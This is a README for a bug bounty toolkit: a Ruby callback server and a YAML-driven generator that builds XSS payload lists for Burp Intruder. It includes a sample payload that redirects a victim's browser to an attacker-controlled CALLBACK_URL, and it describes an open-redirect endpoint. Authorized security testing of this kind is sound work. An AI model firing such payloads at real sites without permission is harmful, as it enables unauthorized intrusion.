# :boom: Bug bounty in a box

This repository contains all\* that you should need to get up and running to test for bugs against your targets.

\* Ok, literally not _everything_ but it's a good start!

## :vertical_traffic_light: Project Status

This is by no means "production ready"; there are still some server configuration options that need to be explored before this should be run in production.

### :shipit: To-do list

1. Productionize the Sinatra callback server
1. Add more payloads!
1. Add more endpoints!
1. Add "Development" guide

## :running: Quickstart

To get up & hacking, you'll need to:

1. Move the configuration sample: `mv config/application.yml.sample config/application.yml`
1. Edit the `config/application.yml` to your preferences
1. Install the gems: `bundle install`
1. Start the server: `ruby app.rb`
1. Move the payload sample: `mv payloads/xss.yml.sample payloads/xss.yml`
1. Generate the payloads: `ruby generate_payloads.rb --callback=YOUR_SERVER_URL --target=YOUR_TARGET`
1. Use `payloads/xss.txt` in Burp's Intruder (or something similar)
1. Cross your fingers...
1. Profit!

## :information_desk_person: How does this work?

This "bug bounty in a box" has two different components:
1. A payload callback server
1. A payload generator

### :pager: Callback Server

The callback server, written in Ruby & using [Sinatra](http://sinatrarb.com/), currently has the following capabilities:

* Callback: A callback with a payload & target parameter will log the "callback" to a on-server text log as well as send a Slack message to a Slack webhook. (`/callback`)
* Redirect: Redirects to a specified URL in the redirect GET parameter. (`/redirect`)

#### Configuring the server

You can configure the server in `config/application.yml`! See below for the different configuration options.

##### Slack

In order to receive Slack callbacks, you'll need to set the appropriate `slack_url`. To generate an incoming webhook for your Slack instance, check out [Slack's Help Center](https://get.slack.help/hc/en-us/articles/115005265063-Incoming-WebHooks-for-Slack).

##### Logging

If you'd like to change either the frequency of the log rotation or the log filenames, check out the configuration file.

### :smiling_imp: Payload Generator

The payload generator uses `.yml` files to generate a `.txt` files that contain a list of payloads that can be used in a tool like Burp Intruder.

#### Running the payload generator

Before running the payload generator, make sure you have some properly formatted `.yml` files in the `payloads` folder! After you've done that, you'll need to run the payload generator with the `--callback` and `--target` flags like such:

```bash
ruby generate_payloads.rb --callback=localhost:4567/callback --target=www.example.com
```

Then, check out the `payloads` folder for the `.txt` file with a list of payloads!

#### Configuring payloads

In order to add a new class of payloads, just create a new `.yml` file with the following:

```yaml
name: XSS
payloads:
  - description: A simple XSS payload
    payload: <script>document.location='CALLBACK_URL'</script>
  - payload: <script>document.location="CALLBACK_URL"</script>
```

The `CALLBACK_URL` will be replaced with whatever is passed in with the `--callback` flag with some added parameters of (1) a callback description & (2) the target.

## :raised_hands: Contributing

Want to contribute? Great! Here's what you do:

1. Fork this repository
1. Push some code to your fork
1. Come back to this repository and open a PR
1. After some review, get that PR merged to master
1. :tada: Thank you for your contribution!!

Feel free to also open an issue with any bugs/comments/requests!
